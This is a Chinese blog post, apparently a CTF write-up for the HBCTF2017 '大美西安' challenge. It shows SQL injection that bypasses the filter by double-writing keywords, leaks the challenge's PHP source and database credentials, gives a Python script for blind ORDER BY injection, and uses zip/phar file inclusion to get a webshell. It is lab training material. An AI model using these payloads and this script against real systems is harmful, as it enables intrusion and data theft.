@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[HBCTF2017]大美西安(sql注入) | 过客</title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[HBCTF2017]大美西安(sql注入) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[HBCTF2017]大美西安(sql注入)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/0OsnFmmwE/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[HBCTF2017]大美西安(sql注入)</h1>
+            <span class="meta">
+            	Posted on
+              2020-03-24，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>首先就一个登陆和注册。貌似没注入。<br>
+进去以后URL如下<code>http://00f9d39c-5972-4a18-9744-2d59c6264341.node3.buuoj.cn/index.php?file=download</code></p>
+<!-- more -->
+<p>尝试用伪协议读取源码。无果<br>
+接着看功能发现有上传。只能上传jpg图片。<br>
+下载。有查看和收藏功能。查看就返回图片。收藏就下载<br>
+看看这个下载点能不能任意文件下载<br>
+<img src="https://guokeya.github.io/post-images/1585033514128.png" alt="" loading="lazy"><br>
+这里是用id来下载。猜测数据库中插入了id/图片路径<br>
+后台sql语句应该类似于<code>select path from image where id=1</code><br>
+那么我们尝试union select去修改结果<br>
+返回picture can't be find!。。语句是肯定对的。估计是被过滤了。<br>
+尝试双写绕过。成功。把源码都脱下来<br>
+<img src="https://guokeya.github.io/post-images/1585033843574.png" alt="" loading="lazy"><br>
+index.php</p>
+<pre><code>&lt;?php 
+#define(&quot;DIR_PERMITION&quot;,time());
+include(&quot;config.php&quot;);
+$_POST = d_addslashes($_POST);
+$_GET = d_addslashes($_GET);
+
+$file  = isset($_GET['file'])?$_GET['file']:&quot;home&quot;;
+// echo $file;
+if(preg_match('/\.\.|^[\s]*\/|^[\s]*php:|filter/i',$file)){
+	   echo &quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;
+		&lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;&quot;;
+		die();
+}
+
+$filename = $file.&quot;.php&quot;;
+
+if(!include($filename)){
+    
+	if(!isset($_SESSION['username'])||!isset($_SESSION['userid'])){
+	  header(&quot;Location: index.php?file=login&quot;);
+	  die();
+    }
+?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>index.php中有一行<code>$filename = $file.&quot;.php&quot;;</code>可以包含用伪协议getshell。<br>
+比如phar:// zip://<br>
+恰好这题有个文件上传功能。改后缀名就可以了。然后配合getshell<br>
+接着着重看upload.php</p>
+<pre><code>&lt;?php 
+
+#defined(&quot;DIR_PERMITION&quot;) or die(&quot;Access denied!&quot;);
+
+if(!isset($_SESSION['username'])||!isset($_SESSION['userid'])){
+	  header(&quot;Location: index.php?file=login&quot;);
+	  die();
+ }
+
+if (isset($_FILES['file'])) {
+    
+    $seed = rand(0,getrandmax());
+    mt_srand($seed);
+    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) {
+        echo &quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;
+		&lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;uplpad file error!:&quot;.$_FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;/i&gt;&lt;/div&gt;&quot;;
+		die();
+    }
+    $fileTypeCheck = ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800));
+    $reg='/^gif|jpg|jpeg|png$/';
+    $fileExtensionCheck=!preg_match($reg,pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+    
+    if($fileExtensionCheck){
+        die(&quot;Only upload image file!&quot;);
+    }
+    if($fileTypeCheck){
+        
+        $fileOldName = addslashes(pathinfo($_FILES['file']['name'],PATHINFO_FILENAME));
+        $fileNewName = './Up10aDs/' . random_str() .'.'.pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
+        $userid = $_SESSION['userid'];
+        $sql= &quot;insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')&quot;;
+        $res = $conn -&gt;query($sql);
+        if($res&amp;&amp;move_uploaded_file($_FILES['file']['tmp_name'], $fileNewName)){
+         echo &quot;&lt;script&gt;alert('file upload success!');window.location.href='index.php?file=home'&lt;/script&gt;&quot;;
+
+        }else{
+             echo &quot;&lt;script&gt;alert('file upload error')&lt;/script&gt;&quot;;
+        }
+
+    }else{
+
+        echo &quot;&lt;script&gt;alert('file  type error');&lt;/script&gt;&quot;;
+    }
+
+}
+
+?&gt;
+</code></pre>
+<p>upload.php。首先检查文件类型和后缀名。<br>
+然后文件重命名为<code>/Up10aDS/random_str().jpg</code><br>
+插入数据库。数据库结构为<code>uid,image_name,location</code><br>
+那么我们得得到这个文件名。之前通过注入得到了源码。肯定也可以得到文件名<br>
+再回过头去看看过滤方法</p>
+<pre><code>&lt;?php 
+
+error_reporting(0);
+session_start();
+
+$dbhost = &quot;127.0.0.1&quot;;
+$dbuser = &quot;admin&quot;;
+$dbpass = &quot;password987~!@&quot;;
+$dbname = &quot;dsqli&quot;;
+
+$conn = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
+$conn -&gt;query(&quot;set names utf8&quot;); 
+
+function d_addslashes($array){
+
+    foreach($array as $key=&gt;$value){
+        if(!is_array($value)){
+              !get_magic_quotes_gpc()&amp;&amp;$value=addslashes($value);
+              $array[$key]=$value;
+        }else{
+          $array[$key] = d_addslashes($array[$key]);
+        }
+    }
+    return $array;
+}
+
+
+function filter($id){
+    $id = strtolower($id);
+    
+	$id = str_replace('select', '', $id);
+	$id = str_replace('update', '', $id);
+	$id = str_replace('insert', '', $id);
+	$id = str_replace('delete', '', $id);
+	$id = str_replace('and', '', $id);
+	$id = str_replace('or', '', $id);
+	$id = str_replace('where', '', $id);
+	$id = str_replace('union', '', $id);
+    $id = str_replace('like', '', $id);
+    $id = str_replace('regexp', '', $id);
+    $id = str_replace('is', '', $id);
+	$id = str_replace('=', '', $id);
+	$id = str_replace(',', '', $id);
+	$id = str_replace('|', '', $id);
+	$id = str_replace('&amp;', '', $id);
+	$id = str_replace('!', '', $id);
+    $id = str_replace('%', '', $id);
+	$id = str_replace('^', '', $id);
+	$id = str_replace('&lt;', '', $id);
+	$id = str_replace('&gt;', '', $id);
+	$id = str_replace('*', '', $id);
+	$id = str_replace('(', '', $id);
+	$id = str_replace(')', '', $id);
+    return $id ;
+}
+
+function random_str($length = &quot;32&quot;)
+{
+    $set = array(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;,  &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, 
+        &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;,
+        &quot;m&quot;,&quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;, &quot;w&quot;,&quot;x&quot;,
+        &quot;y&quot;,&quot;z&quot;,&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;);
+    $str = '';
+    for ($i = 1; $i &lt;= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+    return $str;
+}
+</code></pre>
+<p>都是替换为空。但是这里符号都被过滤了。</p>
+<pre><code>试了几个payload
+substr(location,1,1)=0x61
+#括号被过滤
+strcmp(substr(location,1,1),0x61)
+#括号被过滤
+location regexp '^[a-z]'
+#^被过滤
+</code></pre>
+<p><code>https://xz.aliyun.com/t/7169#toc-50</code><br>
+这篇文章真的棒。找到order by注入<br>
+我们可以构造<code>select location from image where id=1 and union select 0x41 order by 1</code><br>
+当正确的值大于我们输入的值。那么就可以正常回显。<br>
+以下是脚本</p>
+<pre><code>import requests
+url='http://00f9d39c-5972-4a18-9744-2d59c6264341.node3.buuoj.cn/downfile.php'
+cookie={&quot;Cookie&quot;:&quot;PHPSESSID=vpn0ktp56hbod80nnm6869ro52&quot;}
+name='0x2e2f557031306144732f'
+#已知的./Up10aDs/
+r=requests.session()
+for a in range(200):
+    for i in range(30,130):
+        data={&quot;image&quot;:&quot;4 ununionion selselectect &quot;+name+hex(i)[2:]+&quot; oorrder by 1&quot;,
+              &quot;image_download&quot;:&quot;%E6%94%B6%E8%97%8F&quot;}
+        result=r.post(url=url,data=data,headers=cookie).text
+        #print (result)
+        if 'eval' in result:
+            name+=hex(i-1)[2:]
+            print(chr(i-1))
+            break
+</code></pre>
+<p>得到文件名。这里试了下system啥的都没用？？？也没禁用函数。我人傻了<br>
+<img src="https://guokeya.github.io/post-images/1585036112287.png" alt="" loading="lazy"><br>
+解释下这个文件怎么生成的：<br>
+1.php压缩后得到1.zip<br>
+1.zip改名为1.jpg上传<br>
+由于包含时会自动加上.php后缀。最终包含的是phar://1.jpg/1.php<br>
+等同于1.zip/1.php</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/2bwK125wR/">
+              <span class="post-title">
+                BUUCTF kzone(sql注入)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span>过客</span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
